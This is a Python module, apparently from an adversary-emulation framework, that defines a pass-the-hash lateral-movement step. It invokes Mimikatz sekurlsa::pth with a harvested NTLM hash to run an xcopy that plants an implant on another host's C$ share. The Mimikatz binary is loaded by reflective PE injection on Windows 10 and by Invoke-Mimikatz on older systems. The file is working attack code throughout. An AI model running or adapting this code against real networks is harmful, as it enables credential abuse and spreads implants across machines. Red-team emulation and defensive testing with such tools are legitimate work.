from plugins.adversary.app.commands.powershell import PSArg, PSFunction
from plugins.adversary.app.commands.mimikatz import MimikatzCommand, sekurlsa_pth, mimi_exit, privilege_debug
from plugins.adversary.app.operation.operation import Step, OPUser, OPDomain, OPFile, OPCredential, OPHost, OPRat, OPVar
from plugins.adversary.app.commands import parsers


class PassTheHashCopy(Step):
    """
    Description:
        This step uses the Pass the Hash technique to copy a file to a target machine using xcopy.
    Requirements:
        Requires administrative access, domain enumeration, and credentials for an administrator on the target
        machine (needs both administrator enumeration 'GetAdmin', and credential data 'Credentials').
    """
    attack_mapping = [('T1075', 'Lateral Movement'), ('T1105', 'Lateral Movement'), ('T1106', 'Execution')]
    display_name = "pass_the_hash_copy"
    summary = "Copy a file from a computer to another using a credential-injected command prompt"

    preconditions = [("rat", OPRat({"elevated": True})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ("host", OPHost(OPVar("rat.host"))),
                     ('dest_host', OPHost),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('domain', OPDomain(OPVar("user.domain")))]
    postconditions = [("file_g", OPFile({'host': OPVar("dest_host")}))]

    preproperties = ['rat.executable', 'dest_host.hostname', 'domain.windows_domain', 'cred.hash']

    not_equal = [('host', 'dest_host')]

    deterministic = True

    @staticmethod
    def description(host, dest_host):
        return "Using pass the hash to copy an implant from {} to {}".format(host.fqdn, dest_host.fqdn)

    @staticmethod
    async def simulate(operation, rat, user, host, dest_host, cred, domain, file_g):
        return True

    @staticmethod
    async def action(operation, rat, user, host, dest_host, cred, domain, file_g):
        filepath = "\\" + operation.adversary_artifactlist.get_executable_word()
        # echo F | xcopy will automatically create missing directories
        final_command = "cmd.exe /c echo F | xcopy {0} \\\\{1}\\c${2}".format(rat.executable, dest_host.hostname, filepath)

        mimikatz_command = MimikatzCommand(privilege_debug(),
                                           sekurlsa_pth(user=user.username, domain=domain.windows_domain,
                                                        ntlm=cred.hash, run=final_command),
                                           mimi_exit())

        if host.os_version.major_version >= 10:
            # Pass compiled mimikatz.exe into Invoke-ReflectivePEInjection PowerSploit script.  This works on
            # windows 10 and patched older systems (KB3126593 / MS16-014 update installed)
            await operation.reflectively_execute_exe(rat, "mimi64-exe", mimikatz_command.command,
                                                     parsers.mimikatz.sekurlsa_pth)
        else:
            # Use Invoke-Mimikatz (trouble getting this working on Windows 10 as of 8/2017).
            await operation.execute_powershell(rat, "powerkatz",
                                               PSFunction('Invoke-Mimikatz',
                                                          PSArg("Command", mimikatz_command.command.command_line)),
                                               parsers.mimikatz.sekurlsa_pth)

        await file_g({'src_host': dest_host, 'src_path': rat.executable, 'path': "C:" + filepath, 'use_case': 'rat'})

        return True

    @staticmethod
    async def cleanup(cleaner, file_g):
        for file in file_g:
            await cleaner.delete(file)
